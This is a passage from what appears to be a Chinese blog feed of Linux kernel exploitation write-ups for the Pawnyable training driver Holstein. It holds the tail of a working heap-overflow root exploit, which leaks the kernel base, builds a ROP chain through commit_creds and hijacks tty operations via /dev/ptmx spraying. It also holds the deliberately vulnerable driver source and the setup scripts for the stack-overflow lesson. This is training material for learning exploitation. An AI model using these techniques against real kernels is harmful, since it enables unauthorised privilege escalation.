punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">50</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDONLY <span class="token operator">|</span> O_NOCTTY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"open"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">/*leak*/</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x450</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x450</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xc38880</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> heap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x438</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x438</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span> koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] heap => 0x%lx\n"</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//g_buf</span>prepare_kernel_cred_addr<span class="token operator">=</span>prepare_kernel_cred_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>commit_creds_addr<span class="token operator">=</span>commit_creds_addr<span class="token operator">+</span>koff<span class="token punctuation">;</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span>koff<span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVESQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds_addr<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x418</span><span class="token punctuation">]</span><span class="token operator">=</span>heap<span class="token punctuation">;</span><span class="token comment">//overflow ops</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token operator">=</span>PUSH_RDX_POP_RSP_PP_RET<span class="token punctuation">;</span><span class="token comment">//rip</span><span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x420</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>spray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> heap<span class="token operator">+</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/9e48d923aa5ec4f36ee9f13aea8782e3_MD5.jpeg"></p><blockquote><p>é™„ä»¶ï¼š<a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-2.tar.gz">LK01-2.tar.gz</a><br>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.wohin.me/posts/pawnyable-0202/">Linux Kernel PWN | 040202 Pawnyableä¹‹å †æº¢å‡º (wohin.me)</a><br><a href="https://pawnyable-cafe.translate.goog/linux-kernel/LK01/heap_overflow.html?_x_tr_sl=auto&_x_tr_tl=zh-CN&_x_tr_hl=zh-CN&_x_tr_pto=wapp">Holstein v2ï¼šåˆ©ç”¨å †æº¢å‡º | PAWNYABLEï¼ (pawnyable-cafe.translate.goog)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux Kernel pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LK01 Holstein v1 æ ˆæº¢å‡º</title>
      <link href="/2024/01/27/LK01%20Holstein%20v1%20%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2024/01/27/LK01%20Holstein%20v1%20%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>LKMæºç ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cdev.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/fs.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/uaccess.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/slab.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_AUTHOR</span><span class="token punctuation">(</span><span class="token string">"ptr-yudai"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MODULE_DESCRIPTION</span><span class="token punctuation">(</span><span class="token string">"Holstein v1 - Vulnerable Kernel Driver for Pawnyable"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">DEVICE_NAME</span> <span class="token string">"holstein"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFFER_SIZE</span> <span class="token expression"><span class="token number">0x400</span></span></span><span class="token keyword">char</span> <span class="token operator">*</span>g_buf <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_open called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span>BUFFER_SIZE<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>g_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"kmalloc failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_read</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                        <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                        <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> kbuf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_read called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_to_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token class-name">ssize_t</span> <span class="token function">module_write</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">,</span>                            <span class="token keyword">const</span> <span class="token keyword">char</span> __user <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">,</span>                            <span class="token class-name">loff_t</span> <span class="token operator">*</span>f_pos<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> kbuf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_write called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_copy_from_user</span><span class="token punctuation">(</span>kbuf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"copy_from_user failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">memcpy</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> kbuf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> count<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>inode<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token operator">*</span>file<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span>KERN_INFO <span class="token string">"module_close called\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span> module_fops <span class="token operator">=</span>  <span class="token punctuation">&#123;</span>   <span class="token punctuation">.</span>owner   <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">,</span>   <span class="token punctuation">.</span>read    <span class="token operator">=</span> module_read<span class="token punctuation">,</span>   <span class="token punctuation">.</span>write   <span class="token operator">=</span> module_write<span class="token punctuation">,</span>   <span class="token punctuation">.</span>open    <span class="token operator">=</span> module_open<span class="token punctuation">,</span>   <span class="token punctuation">.</span>release <span class="token operator">=</span> module_close<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token class-name">dev_t</span> dev_id<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">cdev</span> c_dev<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> __init <span class="token function">module_initialize</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">alloc_chrdev_region</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dev_id<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> DEVICE_NAME<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to register device\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">cdev_init</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> <span class="token operator">&amp;</span>module_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  c_dev<span class="token punctuation">.</span>owner <span class="token operator">=</span> THIS_MODULE<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">cdev_add</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">,</span> dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span>KERN_WARNING <span class="token string">"Failed to add cdev\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span>EBUSY<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> __exit <span class="token function">module_cleanup</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">cdev_del</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>c_dev<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span>dev_id<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>module_initialize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>module_cleanup<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Makefileï¼š</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">:=</span> vuln.oKBUILD_DIR <span class="token operator">:=</span> /lib/modules/<span class="token variable">$</span><span class="token punctuation">(</span>KVERSION<span class="token punctuation">)</span>/buildCFLAGS_vuln.o <span class="token operator">:=</span> -O0<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KBUILD_DIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span><span class="token function">shell</span> pwd<span class="token punctuation">)</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä½¿ç”¨çš„æ˜¯5.10.7çš„å†…æ ¸ï¼ŒCONFIG_STACKPROTECTOR&#x3D;n</p><h1 id="ä¸€ã€LK01-Holstein-v1"><a href="#ä¸€ã€LK01-Holstein-v1" class="headerlink" title="ä¸€ã€LK01 Holstein v1"></a>ä¸€ã€LK01 Holstein v1</h1><h2 id="ä¸€-ç¨‹åºåˆ†æ"><a href="#ä¸€-ç¨‹åºåˆ†æ" class="headerlink" title="(ä¸€)ç¨‹åºåˆ†æ"></a>(ä¸€)ç¨‹åºåˆ†æ</h2><h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>çœ‹ä¸€ä¸‹rcSï¼šå‘ç°æ˜¯ç›¸ç»§æ‰§è¡Œinit.dä¸‹çš„æ‰€æœ‰shellè„šæœ¬</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment"># Start all init scripts in /etc/init.d</span><span class="token comment"># executing them in numerical order.</span><span class="token comment">#</span><span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> /etc/init.d/S??* <span class="token punctuation">;</span><span class="token keyword">do</span>     <span class="token comment"># Ignore dangling symlinks (if any).</span>     <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">continue</span>     <span class="token keyword">case</span> <span class="token string">"<span class="token variable">$i</span>"</span> <span class="token keyword">in</span>*.sh<span class="token punctuation">)</span>    <span class="token comment"># Source shell script for speed.</span>    <span class="token punctuation">(</span><span class="token builtin class-name">trap</span> - INT QUIT TSTP<span class="token builtin class-name">set</span> start<span class="token builtin class-name">.</span> <span class="token variable">$i</span>    <span class="token punctuation">)</span>    <span class="token punctuation">;</span><span class="token punctuation">;</span>*<span class="token punctuation">)</span>    <span class="token comment"># No sh extension, so fork subprocess.</span>    <span class="token variable">$i</span> start    <span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">esac</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨S99pawnyableä¸­æœ‰å¦‚ä¸‹å‘½ä»¤</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token comment">##</span><span class="token comment">## Setup</span><span class="token comment">##</span>mdev <span class="token parameter variable">-s</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmxstty <span class="token parameter variable">-opost</span><span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token comment">#echo 1 > /proc/sys/kernel/dmesg_restrict</span><span class="token comment">##</span><span class="token comment">## Install driver</span><span class="token comment">##</span>insmod /root/vuln.ko<span class="token function">mknod</span> <span class="token parameter variable">-m</span> <span class="token number">666</span> /dev/holstein c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> holstein /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1;&#125;'</span><span class="token variable">`</span></span> <span class="token number">0</span><span class="token comment">##</span><span class="token comment">## User shell</span><span class="token comment">##</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token builtin class-name">echo</span> <span class="token string">"[ Holstein v1 (LK01) - Pawnyable ]"</span>setsid cttyhack setuidgid <span class="token number">1337</span> <span class="token function">sh</span><span class="token comment">##</span><span class="token comment">## Cleanup</span><span class="token comment">##</span><span class="token function">umount</span> /procpoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>kptr_restrictä¸º2ï¼Œå…ˆæ”¹ä¸º1ï¼Œæ–¹ä¾¿æŸ¥çœ‹å‡½æ•°åœ°å€</p><h3 id="run-sh"><a href="#run-sh" class="headerlink" title="run.sh"></a>run.sh</h3><pre class="line-numbers language-bash" data-language="bash"><code 